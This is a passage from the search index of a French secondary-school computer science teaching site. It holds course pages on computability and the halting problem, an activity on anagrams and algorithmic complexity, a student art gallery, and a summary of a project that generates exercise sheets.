{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Cl\u00e9ment Braun - NSI","text":"SNT - Seconde <p>Sciences Num\u00e9riques et Technologie : d\u00e9couverte des enjeux du num\u00e9rique dans notre soci\u00e9t\u00e9</p> Acc\u00e9der aux ressources NSI - Premi\u00e8re <p>Num\u00e9rique et Sciences Informatiques : initiation \u00e0 la programmation et aux concepts fondamentaux</p> Acc\u00e9der aux ressources NSI - Terminale <p>Approfondissement en informatique : structures de donn\u00e9es, bases de donn\u00e9es et projets avanc\u00e9s</p> Acc\u00e9der aux ressources BTS SIO <p>Approfondissement en informatique : Gestion de projet, programmation logicielle, d\u00e9veloppement d'applications, s\u00e9curit\u00e9 informatique</p> Acc\u00e9der aux ressources Chasse aux Ren'arts <p>D\u00e9fi ludique et p\u00e9dagogique pour mettre en pratique les comp\u00e9tences NSI de mani\u00e8re cr\u00e9ative</p> Participer au d\u00e9fi"},{"location":"#programmes-officiels","title":"\ud83d\udccb Programmes officiels","text":"<ul> <li>Bulletin officiel de la SNT</li> <li>Bulletin officiel de la premi\u00e8re NSI</li> <li>Bulletin officiel de la terminale NSI</li> </ul>"},{"location":"#logiciels-utiles","title":"\ud83d\udcbb Logiciels utiles\ud83c\udf93 Baccalaur\u00e9at NSI\ud83d\udc65 Ont contribu\u00e9 \u00e0 ce site\ud83c\udf10 Sites de coll\u00e8gues de NSI","text":"Visual Studio Code <p>\u00c9diteur de code moderne avec extensions pour Python, JavaScript, C++. Interface intuitive et d\u00e9bogage int\u00e9gr\u00e9.</p> \u2713 Disponible au lyc\u00e9e Thonny <p>IDE Python simple et p\u00e9dagogique, parfait pour d\u00e9buter. Visualisation des variables et d\u00e9bogage pas \u00e0 pas.</p> \u2713 Disponible au lyc\u00e9e VSCodium <p>Version open-source de VS Code sans t\u00e9l\u00e9m\u00e9trie Microsoft. M\u00eames fonctionnalit\u00e9s, plus de confidentialit\u00e9.</p> \u2713 Disponible au lyc\u00e9e PyCharm <p>IDE professionnel pour Python avec refactoring avanc\u00e9, d\u00e9bogage puissant et gestion de projets complexes.</p> \u26a0 Installation personnelle <p>             Le baccalaur\u00e9at NSI est compos\u00e9 de deux \u00e9preuves compl\u00e9mentaires \u00e9valuant les comp\u00e9tences th\u00e9oriques et pratiques.         </p> \ud83d\udcdd \u00c9preuve \u00c9crite Dur\u00e9e 3h30 Exercices 3 exercices R\u00e9partition 2\u00d76pts + 1\u00d78pts 3/4 de la note finale <p>                     \u00c9preuve th\u00e9orique couvrant les concepts du cours, algorithmes et r\u00e9solution de probl\u00e8mes informatiques.                 </p> \ud83d\udcbb \u00c9preuve Pratique Dur\u00e9e 1h00 Exercices 2 exercices Sujets ~40 sujets 1/4 de la note finale <p>                     Programmation sur machine : r\u00e9daction d'algorithme et compl\u00e9tion de code \u00e0 trous.                 </p> \ud83e\udd8a BRAUN Cl\u00e9ment Enseignant d'informatique \ud83d\udcbb DELPLACE Nicolas Enseignant d'informatiqueLyc\u00e9e de l'Escaut de Valenciennes \ud83c\udf93 RAMSTEIN St\u00e9phane Enseignant d'informatiqueLyc\u00e9e Raymond Queneau de Villeneuve-d'Ascq \ud83c\udfeb PAPEGAY Benoit Enseignant \u00e0 l'Universit\u00e9 de Lille \ud83c\udfaf MARCHAND Mathieu Enseignant d'informatiqueLyc\u00e9e Benjamin Franklin d'Auray \u2039 \u203a \ud83d\udcda RELMY Lucas <p>Ressources compl\u00e8tes et exercices pratiques pour NSI</p> Visiter le site \ud83d\udd2c DEMERVILLE Erwan <p>Cours d\u00e9taill\u00e9s et projets innovants en NSI</p> Visiter le site \u26a1 RAMSTEIN St\u00e9phane <p>Approche p\u00e9dagogique moderne et interactive</p> Visiter le site \ud83d\ude80 MARCHAND Mathieu <p>Contenus avanc\u00e9s et m\u00e9thodologie rigoureuse</p> Visiter le site \ud83d\ude80 LEAL Nicolas <p>Contenus avanc\u00e9s et m\u00e9thodologie rigoureuse</p> Visiter le site \ud83d\ude80 QUERTIER Th\u00e9o <p>Contenus avanc\u00e9s et m\u00e9thodologie rigoureuse</p> Visiter le site \ud83d\ude80 CARDOSO Mathieu <p>Contenus avanc\u00e9s et m\u00e9thodologie rigoureuse</p> Visiter le site"},{"location":"chasse_aux_renards/","title":"\ud83c\udfa8 Chasse aux Ren'Arts","text":"Galerie des \u0152uvres d'Art Renardis\u00e9es <p>D\u00e9couvrez les cr\u00e9ations artistiques de nos \u00e9l\u00e8ves qui ont revisit\u00e9 les grands classiques de l'art en y int\u00e9grant notre mascotte renard !</p> <p>Navigation dans la galerie</p> <p>Cliquez sur une \u0153uvre pour l'agrandir et d\u00e9couvrir tous les d\u00e9tails. Utilisez les fl\u00e8ches du clavier ou les boutons pour naviguer.</p>"},{"location":"chasse_aux_renards/#edition-2024-2025","title":"\ud83d\uddbc\ufe0f \u00c9dition 2024-2025","text":"\u2039 1 / 17 \u203a Le Semeur et le Renard <p>Christopher</p> <p>d'apr\u00e8s \"Le Semeur\" de Vincent van Gogh (1888)</p> La Cr\u00e9ation du Renard <p>Elliott</p> <p>d'apr\u00e8s \"La Cr\u00e9ation d'Adam\" de Michel-Ange (vers 1511)</p> La fable du renard et de la proie <p>Ethan</p> <p>d'apr\u00e8s \"La fable du chien et de la proie\" de Paul de Vos (17e si\u00e8cle)</p> Conversation de renards dans un patio <p>Enzo</p> <p>d'apr\u00e8s \"Conversation dans un patio \u00e0 Alger\" de Rudolf Ernst (Fin XIXe)</p> L'Ange renard d\u00e9chu <p>Ewan</p> <p>d'apr\u00e8s \"L'Ange d\u00e9chu\" d'Alexandre Cabanel (1847)</p> Kitagawa UtamaRen'Art <p>Hugo</p> <p>d'apr\u00e8s \"K\u014dmei San Bijin - Trois beaut\u00e9s c\u00e9l\u00e8bres\" d'Utamaro (1792-1793)</p> Le renard \u00e0 la perle <p>L\u00e9on</p> <p>d'apr\u00e8s \"La Jeune Fille \u00e0 la perle\" de Johannes Vermeer (1665)</p> Autoportrait du renard \u00e0 l'oreille band\u00e9e <p>Lino</p> <p>d'apr\u00e8s \"Autoportrait \u00e0 l'oreille band\u00e9e\" de Vincent van Gogh (1889)</p> Malcesine aux renards <p>Lois</p> <p>d'apr\u00e8s \"Malcesine sur le lac de Garde\" de Gustav Klimt</p> Sky Palace Renardis\u00e9 <p>Lowen</p> <p>Cr\u00e9ation originale de Lowen L. (2024)</p> Renard au ballon <p>Lucas</p> <p>d'apr\u00e8s \"La Petite Fille au Ballon\" de Banksy</p> La Vague de Kanagafox <p>M. Braun</p> <p>d'apr\u00e8s \"La Grande Vague de Kanagawa\" de Katsushika Hokusai (1830-1833)</p> Renartumne <p>Mathis</p> <p>d'apr\u00e8s \"Vertumne\" de Giuseppe Arcimboldo (1590)</p> Le Fils du Renard <p>Maxime</p> <p>d'apr\u00e8s \"Le Fils de l'homme\" de Ren\u00e9 Magritte (1964)</p> Foxes around the mountains <p>Nathan</p> <p>d'apr\u00e8s \"Among the Sierra Nevada, California\" d'Albert Bierstadt (1868)</p> La Laiti\u00e8re aux aguets <p>Nolann</p> <p>d'apr\u00e8s \"La Laiti\u00e8re\" de Johannes Vermeer (vers 1658-1660)</p> The Fox of Babylone <p>Terry</p> <p>d'apr\u00e8s \"The Fall of Babylon\" de John Martin (1831)</p>"},{"location":"project_summary/","title":"Synth\u00e8se du Projet - Syst\u00e8me de Fiches d'Exercices NSI","text":""},{"location":"project_summary/#vue-densemble","title":"Vue d'ensemble","text":"<p>Ce projet a permis de cr\u00e9er un syst\u00e8me complet et standardis\u00e9 pour la gestion des fiches d'exercices dans le cadre des cours de NSI (Num\u00e9rique et Sciences Informatiques). Le syst\u00e8me couvre les trois niveaux : Seconde, Premi\u00e8re et Terminale.</p>"},{"location":"project_summary/#objectifs-atteints","title":"Objectifs Atteints","text":""},{"location":"project_summary/#standardisation-des-fiches-dexercices","title":"\u2705 Standardisation des Fiches d'Exercices","text":"<ul> <li>Structure HTML unifi\u00e9e avec navigation par onglets</li> <li>CSS coh\u00e9rent pour une exp\u00e9rience utilisateur optimale</li> <li>JavaScript int\u00e9gr\u00e9 pour l'interactivit\u00e9 (affichage/masquage des solutions)</li> <li>Accessibilit\u00e9 respect\u00e9e (attributs lang, structure des titres)</li> </ul>"},{"location":"project_summary/#systeme-de-templates","title":"\u2705 Syst\u00e8me de Templates","text":"<ul> <li>Template de base (<code>base_exercise_template.html</code>) r\u00e9utilisable</li> <li>Template de cartes (<code>exercise_card_template.html</code>) pour les exercices individuels</li> <li>Placeholders pour une g\u00e9n\u00e9ration automatique</li> </ul>"},{"location":"project_summary/#schema-json-standardise","title":"\u2705 Sch\u00e9ma JSON Standardis\u00e9","text":"<ul> <li>Structure d\u00e9finie dans <code>exercise_schema.json</code></li> <li>M\u00e9tadonn\u00e9es compl\u00e8tes (titre, sujet, niveau, version, auteur)</li> <li>Organisation par difficult\u00e9 (Introduction, Facile, Interm\u00e9diaire, Difficile)</li> <li>Validation automatique des donn\u00e9es</li> </ul>"},{"location":"project_summary/#scripts-dautomatisation","title":"\u2705 Scripts d'Automatisation","text":""},{"location":"project_summary/#1-generation-generate_exercise_htmlpy","title":"1. G\u00e9n\u00e9ration (<code>generate_exercise_html.py</code>)","text":"<ul> <li>Conversion JSON \u2192 HTML</li> <li>Validation des donn\u00e9es d'entr\u00e9e</li> <li>Utilisation des templates standardis\u00e9s</li> </ul>"},{"location":"project_summary/#2-validation-validate_exercise_sheetspy","title":"2. Validation (<code>validate_exercise_sheets.py</code>)","text":"<ul> <li>V\u00e9rification de la structure HTML</li> <li>Contr\u00f4le des ressources CSS/JS</li> <li>D\u00e9tection des sections vides</li> <li>Rapport d\u00e9taill\u00e9 des probl\u00e8mes</li> </ul>"},{"location":"project_summary/#3-correction-fix_exercise_sheetspy","title":"3. Correction (<code>fix_exercise_sheets.py</code>)","text":"<ul> <li>R\u00e9paration automatique des fiches probl\u00e9matiques</li> <li>Extraction et r\u00e9organisation du contenu existant</li> <li>Application des templates standardis\u00e9s</li> <li>G\u00e9n\u00e9ration d'introductions contextuelles</li> </ul>"},{"location":"project_summary/#4-test-test_exercise_sheetspy","title":"4. Test (<code>test_exercise_sheets.py</code>)","text":"<ul> <li>Tests complets de qualit\u00e9</li> <li>V\u00e9rification de l'accessibilit\u00e9</li> <li>Validation de l'interactivit\u00e9</li> <li>Rapport de conformit\u00e9</li> </ul>"},{"location":"project_summary/#integration-cicd","title":"\u2705 Int\u00e9gration CI/CD","text":"<ul> <li>GitHub Actions configur\u00e9 dans <code>.github/workflows/ci.yml</code></li> <li>Validation automatique lors des push/pull requests</li> <li>D\u00e9ploiement conditionnel bas\u00e9 sur la qualit\u00e9</li> </ul>"},{"location":"project_summary/#resultats-quantitatifs","title":"R\u00e9sultats Quantitatifs","text":""},{"location":"project_summary/#fiches-de-terminale-corrigees","title":"Fiches de Terminale Corrig\u00e9es","text":"<ul> <li>5 fiches d'exercices trait\u00e9es et corrig\u00e9es</li> <li>Taux de r\u00e9ussite : 100% apr\u00e8s correction</li> <li>Score moyen : 97.6% (de 92.9% \u00e0 100%)</li> </ul>"},{"location":"project_summary/#fichiers-crees","title":"Fichiers Cr\u00e9\u00e9s","text":"<ul> <li>2 templates HTML r\u00e9utilisables</li> <li>1 sch\u00e9ma JSON de validation</li> <li>4 scripts Python d'automatisation</li> <li>1 fichier de configuration CI/CD mis \u00e0 jour</li> <li>2 documents de documentation (directives + synth\u00e8se)</li> <li>1 exemple complet avec donn\u00e9es de test</li> </ul>"},{"location":"project_summary/#architecture-du-systeme","title":"Architecture du Syst\u00e8me","text":"<pre><code>nsi-courses/\n\u251c\u2500\u2500 templates/                    # Templates r\u00e9utilisables\n\u2502   \u251c\u2500\u2500 base_exercise_template.html\n\u2502   \u2514\u2500\u2500 exercise_card_template.html\n\u251c\u2500\u2500 schemas/                      # Validation des donn\u00e9es\n\u2502   \u2514\u2500\u2500 exercise_schema.json\n\u251c\u2500\u2500 scripts/                      # Outils d'automatisation\n\u2502   \u251c\u2500\u2500 generate_exercise_html.py\n\u2502   \u251c\u2500\u2500 validate_exercise_sheets.py\n\u2502   \u251c\u2500\u2500 fix_exercise_sheets.py\n\u2502   \u2514\u2500\u2500 test_exercise_sheets.py\n\u251c\u2500\u2500 examples/                     # Exemples et tests\n\u2502   \u251c\u2500\u2500 example_exercise_data.json\n\u2502   \u2514\u2500\u2500 generated_exercise_sheet.html\n\u251c\u2500\u2500 docs/                         # Documentation\n\u2502   \u251c\u2500\u2500 exercise_creation_guidelines.md\n\u2502   \u2514\u2500\u2500 project_summary.md\n\u2514\u2500\u2500 .github/workflows/            # CI/CD\n    \u2514\u2500\u2500 ci.yml\n</code></pre>"},{"location":"project_summary/#fonctionnalites-cles","title":"Fonctionnalit\u00e9s Cl\u00e9s","text":""},{"location":"project_summary/#1-navigation-intuitive","title":"1. Navigation Intuitive","text":"<ul> <li>Onglets dynamiques : Introduction, Facile, Interm\u00e9diaire, Difficile</li> <li>Transitions fluides entre les sections</li> <li>\u00c9tat persistant de la navigation</li> </ul>"},{"location":"project_summary/#2-interactivite-des-solutions","title":"2. Interactivit\u00e9 des Solutions","text":"<ul> <li>Boutons toggle pour afficher/masquer les corrections</li> <li>Animations CSS pour une meilleure UX</li> <li>Solutions d\u00e9taill\u00e9es avec explications</li> </ul>"},{"location":"project_summary/#3-responsive-design","title":"3. Responsive Design","text":"<ul> <li>Adaptation mobile via viewport meta</li> <li>CSS flexible pour tous les \u00e9crans</li> <li>Accessibilit\u00e9 respect\u00e9e</li> </ul>"},{"location":"project_summary/#4-systeme-de-difficulte","title":"4. Syst\u00e8me de Difficult\u00e9","text":"<ul> <li>Introduction : Concepts cl\u00e9s et conseils</li> <li>Facile : Application directe (5-10 lignes de code)</li> <li>Interm\u00e9diaire : Combinaison de concepts (10-30 lignes)</li> <li>Difficile : Probl\u00e8mes complexes et optimisation</li> </ul>"},{"location":"project_summary/#workflow-de-creation","title":"Workflow de Cr\u00e9ation","text":""},{"location":"project_summary/#1-creation-manuelle","title":"1. Cr\u00e9ation Manuelle","text":"<pre><code># 1. Cr\u00e9er les donn\u00e9es JSON\ncp examples/example_exercise_data.json new_exercise.json\n# 2. \u00c9diter le contenu\n# 3. G\u00e9n\u00e9rer le HTML\npython3 scripts/generate_exercise_html.py new_exercise.json output.html\n# 4. Valider\npython3 scripts/validate_exercise_sheets.py output.html\n</code></pre>"},{"location":"project_summary/#2-correction-automatique","title":"2. Correction Automatique","text":"<pre><code># Corriger des fiches existantes\npython3 scripts/fix_exercise_sheets.py /path/to/exercise/files/\n</code></pre>"},{"location":"project_summary/#3-test-de-qualite","title":"3. Test de Qualit\u00e9","text":"<pre><code># Tester la conformit\u00e9\npython3 scripts/test_exercise_sheets.py /path/to/files/ report.txt\n</code></pre>"},{"location":"project_summary/#standards-de-qualite","title":"Standards de Qualit\u00e9","text":""},{"location":"project_summary/#criteres-de-validation","title":"Crit\u00e8res de Validation","text":"<ul> <li>\u2705 Structure HTML5 valide</li> <li>\u2705 M\u00e9tadonn\u00e9es compl\u00e8tes (charset, viewport, title)</li> <li>\u2705 Ressources CSS pr\u00e9sentes</li> <li>\u2705 Navigation fonctionnelle</li> <li>\u2705 Sections bien d\u00e9finies</li> <li>\u2705 JavaScript op\u00e9rationnel</li> <li>\u2705 Cartes d'exercices structur\u00e9es</li> <li>\u2705 Accessibilit\u00e9 respect\u00e9e</li> </ul>"},{"location":"project_summary/#seuils-de-reussite","title":"Seuils de R\u00e9ussite","text":"<ul> <li>\u2265 80% : Fiche accept\u00e9e</li> <li>60-79% : Avertissement</li> <li>&lt; 60% : Correction requise</li> </ul>"},{"location":"project_summary/#impact-pedagogique","title":"Impact P\u00e9dagogique","text":""},{"location":"project_summary/#pour-les-enseignants","title":"Pour les Enseignants","text":"<ul> <li>Cr\u00e9ation simplifi\u00e9e de nouvelles fiches</li> <li>Coh\u00e9rence visuelle entre tous les supports</li> <li>Maintenance facilit\u00e9e gr\u00e2ce \u00e0 l'automatisation</li> <li>Qualit\u00e9 garantie par la validation automatique</li> </ul>"},{"location":"project_summary/#pour-les-etudiants","title":"Pour les \u00c9tudiants","text":"<ul> <li>Navigation intuitive entre les niveaux de difficult\u00e9</li> <li>Solutions interactives pour l'auto-correction</li> <li>Progression p\u00e9dagogique claire</li> <li>Exp\u00e9rience utilisateur optimis\u00e9e</li> </ul>"},{"location":"project_summary/#evolutions-futures","title":"\u00c9volutions Futures","text":""},{"location":"project_summary/#court-terme","title":"Court Terme","text":"<ul> <li>Extension aux niveaux Seconde et Premi\u00e8re</li> <li>Ajout de nouveaux sujets (IA, cybers\u00e9curit\u00e9)</li> <li>Am\u00e9lioration des heuristiques de classification automatique</li> </ul>"},{"location":"project_summary/#moyen-terme","title":"Moyen Terme","text":"<ul> <li>Interface graphique pour la cr\u00e9ation de fiches</li> <li>Syst\u00e8me de tags avanc\u00e9</li> <li>Analytics d'utilisation des exercices</li> <li>Export PDF automatique</li> </ul>"},{"location":"project_summary/#long-terme","title":"Long Terme","text":"<ul> <li>Plateforme collaborative pour les enseignants</li> <li>Base de donn\u00e9es centralis\u00e9e d'exercices</li> <li>IA pour la g\u00e9n\u00e9ration automatique d'exercices</li> <li>Int\u00e9gration LMS (Moodle, etc.)</li> </ul>"},{"location":"project_summary/#maintenance-et-support","title":"Maintenance et Support","text":""},{"location":"project_summary/#documentation","title":"Documentation","text":"<ul> <li>Directives de cr\u00e9ation d\u00e9taill\u00e9es</li> <li>Exemples pratiques fournis</li> <li>FAQ pour les probl\u00e8mes courants</li> </ul>"},{"location":"project_summary/#monitoring","title":"Monitoring","text":"<ul> <li>CI/CD automatique pour la qualit\u00e9</li> <li>Rapports de validation r\u00e9guliers</li> <li>Alertes en cas de r\u00e9gression</li> </ul>"},{"location":"project_summary/#support","title":"Support","text":"<ul> <li>Scripts de diagnostic int\u00e9gr\u00e9s</li> <li>Correction automatique des probl\u00e8mes courants</li> <li>Logs d\u00e9taill\u00e9s pour le d\u00e9bogage</li> </ul>"},{"location":"project_summary/#conclusion","title":"Conclusion","text":"<p>Le syst\u00e8me de fiches d'exercices NSI est maintenant op\u00e9rationnel et offre :</p> <ol> <li>Standardisation compl\u00e8te des supports p\u00e9dagogiques</li> <li>Automatisation des t\u00e2ches r\u00e9p\u00e9titives</li> <li>Qualit\u00e9 garantie par la validation continue</li> <li>\u00c9volutivit\u00e9 pour les besoins futurs</li> <li>Documentation compl\u00e8te pour la maintenance</li> </ol> <p>Le projet constitue une base solide pour l'am\u00e9lioration continue de l'enseignement NSI, avec des outils robustes et une architecture extensible.</p> <p>Projet r\u00e9alis\u00e9 avec succ\u00e8s - Toutes les fiches de Terminale sont maintenant conformes aux standards de qualit\u00e9 (100% de r\u00e9ussite aux tests).</p>"},{"location":"2024/Calculabilit%C3%A9_d%C3%A9cidabilit%C3%A9/sujet/","title":"Calculabilit\u00e9 &amp; D\u00e9cidabilit\u00e9","text":""},{"location":"2024/Calculabilit%C3%A9_d%C3%A9cidabilit%C3%A9/sujet/#introduction-un-programme-est-une-donnee","title":"Introduction : Un programme est une donn\u00e9e","text":"<p>Une donn\u00e9e est une valeur exploitable dans un programme. Cette valeur peut \u00eatre modifi\u00e9e lors de l'appel de celui-ci.</p> <p>Cependant, un programme parent peut aussi prendre un autre programme comme donn\u00e9e.</p> <pre><code>def cercle(n):\n    return 2 * math.pi * n\n\ndef carre(n):\n    return 4 * n\n\ndef triangle_equilateral(n):\n    return 3 * n\n\ndef pentagone_regulier(n):\n    return 5 * n\n\ndef perimetre(forme,n):\n    return forme(n)\n\nliste_formes = [cercle,carre,triangle_equilateral,pentagone_regulier]\n\nfor forme in liste_formes:\n    print(perimetre(forme,5))\n</code></pre> <p>Utiliser des fonctions comme donn\u00e9es peut permettre de modulariser son programme et de l'adapter pour des modifications futures (ajout de fonctionnalit\u00e9s, modification de fonctions d\u00e9j\u00e0 existantes...).</p>"},{"location":"2024/Calculabilit%C3%A9_d%C3%A9cidabilit%C3%A9/sujet/#definitions","title":"D\u00e9finitions","text":"<p>Un algorithme est une suite finie d'instructions qui r\u00e9sout un probl\u00e8me.</p> <p>Un probl\u00e8me en informatique est une traduction math\u00e9matique d'une question que l'on peut se poser.</p> <p>On dit qu'un probl\u00e8me est calculable si ce probl\u00e8me peut \u00eatre mod\u00e9lis\u00e9 par un algorithme. On appelle th\u00e9orie de la calculabilit\u00e9 l'\u00e9tude de la calculabilit\u00e9 d'un probl\u00e8me, c'est-\u00e0-dire, si un probl\u00e8me est calculable ou non.</p> <p>On dit qu'un probl\u00e8me est d\u00e9cidable si ce probl\u00e8me peut \u00eatre r\u00e9pondu par oui ou non, True ou False. On appelle th\u00e9orie de la d\u00e9cidabilit\u00e9 l'\u00e9tude de la d\u00e9cidabilit\u00e9 d'un probl\u00e8me, c'est-\u00e0-dire, si un probl\u00e8me est d\u00e9cidable ou non.</p> <p>La calculabilit\u00e9 et la d\u00e9cidabilit\u00e9 sont des fondements de l'informatique th\u00e9orique.</p> <p>L'origine de l'inter\u00eat de ces th\u00e9ories remonte au XVII\u00e8me si\u00e8cle quand Gottfried Wilhelm Leibniz, un \u00e9rudit, se demandait s'il \u00e9tait possible qu'une machine puisse r\u00e9soudre tous les probl\u00e8mes (math\u00e9matiques, de d\u00e9cision, de calcul...).</p> <p>Cette reflexion a \u00e9t\u00e9 remise au premier plan en 1928 par les math\u00e9maticiens allemands David Hilbert et Wilhelm Ackermann en posant le Entscheidungproblem ou probl\u00e8me de d\u00e9cision : \"Peut on toujours de\u0301cider de fac\u0327on me\u0301canique si un e\u0301nonce\u0301 est vrai?\"</p> <p>Vid\u00e9o introduction</p>"},{"location":"2024/Calculabilit%C3%A9_d%C3%A9cidabilit%C3%A9/sujet/#letude-de-lentscheidungproblem","title":"L'\u00e9tude de l'Entscheidungproblem","text":"<p>David Hilbert cherchait \u00e0 montrer que le probl\u00e8me de la d\u00e9cision pouvait \u00eatre d\u00e9cid\u00e9. Il n'a cependant jamais pu le prouver donc a suppos\u00e9 que c'\u00e9tait vrai. Si cela \u00e9tait vrai, on aurait eu une r\u00e9volution dans le monde de l'informatique car on aurait une preuve qu'un programme peut indiquer que d'autres sont vrais ou non. Cependant, si cela \u00e9tait faux, on prouverait qu'un tel programme n'existe pas et que donc tous les programmes ne peuvent pas \u00eatre d\u00e9cid\u00e9s et que par ailleurs, tous les programmes ne peuvent pas \u00eatre calcul\u00e9s.</p> <p>On peut le r\u00e9sumer par ce sch\u00e9ma d'ensembles :</p> <p></p> <p>Une d\u00e9c\u00e9nie plus tard, plusieurs math\u00e9maticiens ce sont pench\u00e9s sur ce probl\u00e8me dont Alan Turing et Alonzo Church.</p>"},{"location":"2024/Calculabilit%C3%A9_d%C3%A9cidabilit%C3%A9/sujet/#machine-de-turing","title":"Machine de Turing","text":"<p>La machine de Turing est une machine th\u00e9orique. Elle n'as pas \u00e9tait pens\u00e9e pour exister physiquement. Elle est constitu\u00e9e :</p> <p>un ruban infini une t\u00eate de lecture qui peut lire et \u00e9crire sur ce ruban. une table d'\u00e9tat</p> <p>La machine se trouve dans un \u00e9tat, elle lis un symbole sur le ruban puis elle effectue les actions associ\u00e9es dans la table d'\u00e9tat. La table d'\u00e9tat est compos\u00e9 de deux colonnes : Premi\u00e8re colonne : etat actuel &amp; symbole lus Deuxi\u00e8me colonne : etat suivant &amp; d\u00e9placement de la t\u00eate de lecture &amp; symbole \u00e0 \u00e9crire</p> <p>Cette machine de calcul permet de r\u00e9fl\u00e9chir sur la calculabilit\u00e9 d'un programme. En effet Church \u00e9nonce plusieurs choses dans dans sa th\u00e8se: Toute fonction calculable est calculable sur une machine de Turing. Chaque model(de calcul) poss\u00e8de la m\u00eame puissance de calcul</p> <p>Par d\u00e9finition, pour savoir si un programme est calculable(sur nos machines) on peut \u00e9tudier s'il est calculable sur une machine de Turing.</p>"},{"location":"2024/Calculabilit%C3%A9_d%C3%A9cidabilit%C3%A9/sujet/#lambda-calcul","title":"Lambda Calcul","text":"<pre><code>pentagone_regulier = lambda x : 5*x\n</code></pre>"},{"location":"2024/Calculabilit%C3%A9_d%C3%A9cidabilit%C3%A9/sujet/#une-maniere-pour-demontrer-probleme-de-larret","title":"Une mani\u00e8re pour d\u00e9montrer : Probl\u00e8me de l'arret","text":"<p>S'attaquer au probl\u00e8me de la d\u00e9cision \u00e9tait assez ambitieux pour Church et Turing. Ils ont alors choisi d'aborder le probl\u00e8me de l'arr\u00eat. S'ils r\u00e9ussissaient \u00e0 valider ce probl\u00e8me, aborder le probl\u00e8me de la d\u00e9cision est possible.</p> <p>On a expliqu\u00e9 pr\u00e9c\u00e9demment que le mod\u00e8le de la Machine de Turing est \u00e9quivalent en terme de calcul au mod\u00e8le de Von Neumann ou au lambda-calcul.</p> <p>On peut se munir de deux fonctions python :</p> <pre><code>def arret_garanti(fonction : Callable, args*):\n    '''\n    Param\u00e8tres :\n    entr\u00e9e : fonction : une fonction\n             args* : les param\u00e8tres de la fonction pass\u00e9e en param\u00e8tre\n    sortie : un bool\u00e9en\n\n    Renvoie True si le programme pass\u00e9 en param\u00e8tre s'arr\u00eate, False sinon.\n    '''\n    return #programme s'arrete\n\n\n\n\ndef une_fonction(n):\n    '''\n    Param\u00e8tres:\n    entr\u00e9e : un entier n\n    sortie : une_fonction(n) si arret_garanti renvoie True, 1 sinon\n\n    Fait tourner une_fonction en boucle si elle s'arrete, \n    renvoie un entier sinon.\n    '''\n    if arret_garanti(une_fonction(n)):\n        return une_fonction(n)\n    else : \n        return 1\n</code></pre> <p>La fonction arret_garanti, si elle fonctionne correctement, indique si un programme s'arr\u00eate ou non.</p> <p>La fonction une_fonction, au vu de son impl\u00e9mentation, doit s'arr\u00eater (renvoyer 1) si arret_garanti indique qu'elle ne s'arr\u00eate pas. De la m\u00eame mani\u00e8re, si arret_garanti indique que la fonction une_fonction s'arr\u00eate, on appelle \u00e0 nouveau une_fonction, donc elle ne s'arr\u00eate pas.</p> <p>En analysant le code, on remarque que l'on se trouve dans le cas d'un paradoxe.</p> <p>Ce contre-exemple indique donc que soit une_fonction n'est pas r\u00e9alisable, soit arret_garanti n'est pas r\u00e9alisable.</p> <p>Le fait que une_fonction d\u00e9pende du r\u00e9sultat de son \u00e9valuation par arret_garanti impose donc que la fonction arret_garanti ne peut pas \u00eatre \u00e9crite.</p> <p>Comme ce probl\u00e8me de l'arr\u00eat n'est pas d\u00e9cidable, Church et Turing ont indiqu\u00e9 que le probl\u00e8me de la d\u00e9cision ne pouvait pas l'\u00eatre. Cela a donc eu pour cons\u00e9quence de montrer que tous les programmes ne peuvent \u00eatre d\u00e9cid\u00e9s.</p>"},{"location":"2024/Complexit%C3%A9%20algorithmique/sujet/","title":"Travail sur la compl\u00e9xit\u00e9 : Anagrammes","text":"<p>La compl\u00e9xit\u00e9 algorithmique est une notion assez abstraite en informatique.</p> <p>Rappel : La complexit\u00e9 d'un algorithme correspond au nombre d'op\u00e9rations \u00e9l\u00e9mentaires r\u00e9alis\u00e9es au court d'un algorithme en fonction de la taille de la donn\u00e9e utilis\u00e9e.\\ La compl\u00e9xit\u00e9 d'un algorithme peut \u00eatre associ\u00e9 \u00e0 une fonction de compl\u00e9xit\u00e9:</p> <p>constante, lin\u00e9aire, semi-lin\u00e9aire, logarithmique, quadratique, exponentielle.</p> <p>Exemple : pour le tri par insertion d'une liste de taille \\(n\\), la complexit\u00e9 de l'algorithme correspond environ au nombre d'\u00e9change de valeurs et du nombre de parcours de la liste qui sont r\u00e9p\u00e9t\u00e9s au maximum \\(n\u00b2\\). On \u00e9crit que \\(C_{tri~par~insertion} = O(n\u00b2)\\).</p> <p>Cette activit\u00e9 permettra de mettre en valeur que l'implantation d'un algorithme peut se faire de diff\u00e9rentes mani\u00e8res et que la complexit\u00e9 de celui-ci peut \u00eatre totalement diff\u00e9rentes.</p> <p>Un anagramme d'un mot est un mot qui peut s'\u00e9crire avec les m\u00eames lettres qu'un autre. Par exemple : Typhon est l'anagramme de Python.</p> <p>Ce TP permettra de vous sensibiliser \u00e0 ce qu'est la complexit\u00e9 algorithmique et quelle est son importance gr\u00e2ce \u00e0 une \u00e9tude de courbe de complexit\u00e9.</p> <p>Vous \u00e9crirez l'int\u00e9gralit\u00e9 des r\u00e9ponses aux questions dans le fichier Python fourni</p>"},{"location":"2024/Complexit%C3%A9%20algorithmique/sujet/#partie-1-anagramme-grace-a-une-clef","title":"Partie 1 : Anagramme gr\u00e2ce \u00e0 une clef","text":"<p>Le but de cette premi\u00e8re partie est de trouver les anagrammes d'un mot pass\u00e9 en param\u00e8tre d'une fonction anagramme et qui parcourra tout le lexique de mot fourni pour trouver ses anagrammes.</p> <p>Un mot peut \u00eatre associ\u00e9 \u00e0 une clef. Cette clef, pour nous simplifier la t\u00e2che peut correspondre aux lettres en minuscule, sans accent, tri\u00e9es par ordre croissant.</p> <ul> <li>Question 1 : Ecrire un dictionnaire equivalences qui permet d'associer \u00e0 tous les caract\u00e8res avec accent, leur \u00e9quivalent sans accent.</li> </ul> <pre><code>&gt;&gt;&gt; print(equivalence['\u00e9'])\ne\n</code></pre> <ul> <li>Question 2 : Ecrire une fonction python sans_accent qui prend en param\u00e8tre une mot en minuscule et renvoie son \u00e9criture sans accent.</li> </ul> <pre><code>&gt;&gt;&gt; print(sans_accent('orang\u00e9'))\norange\n</code></pre> <p></p> <p>On souhaite trier la chaine de caract\u00e8re par ordre alphab\u00e9tique pour trouver des anagrammes correspondant plus facilement. En effet, deux anagrammes auront les m\u00eames lettres en m\u00eame nombre tri\u00e9es dans l'ordre alphab\u00e9tique, on aura donc notre clef. Le soucis est que la m\u00e9thode <code>sort</code> en Python n'existe pas pour les 